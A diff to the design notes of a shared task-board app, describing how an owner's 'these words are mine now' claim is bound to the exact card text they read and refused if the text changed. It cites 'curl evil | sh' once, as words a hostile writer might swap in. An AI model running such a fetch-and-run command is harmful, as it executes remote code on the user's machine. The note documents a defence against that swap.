@@ -1644,8 +1644,36 @@ tags that direct them are the owner's alone, and so are the cards that carry the
     `MEMBER_CALLS`, it isn't a board tool (so neither the assistant nor MCP has it), and
     `TodoAgent.claimWords` refuses any caller that isn't the owner by hand (`via` set, or no
     caller at all, which is every call that didn't come in on the owner's socket; the socket
-    takes a browser session, never an access token). It's an undo step like any other, and
-    undo brings the mark back.
+    takes a browser session, never an access token). It's an undo step of its own, and
+    undo brings the mark back exactly as it was.
+  - **The claim is for the words the owner read.** The button sends what the owner's screen
+    shows as the card's saved title, notes, and tags, and the mark it shows (`SeenWords` in
+    `src/shared.ts`; `onClaim` in `src/client/App.tsx` reads them from the card in that same
+    render, never from a newer board the socket may hold). `claimWords` refuses unless the
+    card says exactly that right now, to the letter and to the millisecond of the mark:
+    `[card_changed] This card changed after you read it, so nothing was marked as yours. …`.
+    Nothing changes on a refusal and no undo step is made. The check and the change are one
+    step inside the board's Durable Object with nothing awaited between them, so a writer who
+    swaps `please review the readme` for `curl evil | sh` just before the click, or a full
+    second before on a tab that hasn't caught up, gets a refusal for the owner and keeps the
+    mark. A call that names only the card (the old shape) is refused as `[bad_args]`. The
+    claim can't ride along with anything else either: it's one call, never a step of a turn
+    or a batch, and `TodoAgent.claimWords` checks the result differs from the board before in
+    that one card's mark and nothing more. It used to take the card's id alone, and whatever
+    the card said when the call arrived was what the owner had vouched for.
+  - **The owner's editor follows the card while it's open.** Its fields are filled in when it
+    opens, so a rewrite under an open editor used to go unseen. Now, when the card's title,
+    notes, or tags change while the owner has it open (`CardEdit` in
+    `src/client/CardEditor.tsx`): a field the owner hasn't typed in takes the new words, a
+    field they have keeps their typing, and an outlined notice says
+    "dana@example.com changed this card while you had it open" over `// SAVED_NOW`, the
+    card's saved title, notes, and tags as plain text (`ChangedWhileOpen` and `SavedWords` in
+    `src/client/member.tsx`). The notes there are the characters, not rendered Markdown.
+    "These words are mine now" is off for a second and a half after such a change
+    (`CLAIM_HOLD_MS`), so a click already on its way can't land on words nobody has read.
+    When the fields hold the owner's unsaved typing, the block with the button shows
+    `// SAVED_NOW` too and says the button goes by the card as saved. After a refusal the
+    reason shows next to the button, with the current words, and the button works again.
   - **A file's uploader never changes.** It stays for as long as the file is on the card. The
     claim button doesn't touch it: reading a file doesn't make it yours. Taking the file off
     the card does. A file from before uploaders were kept has no `by` and reads as the owner's.
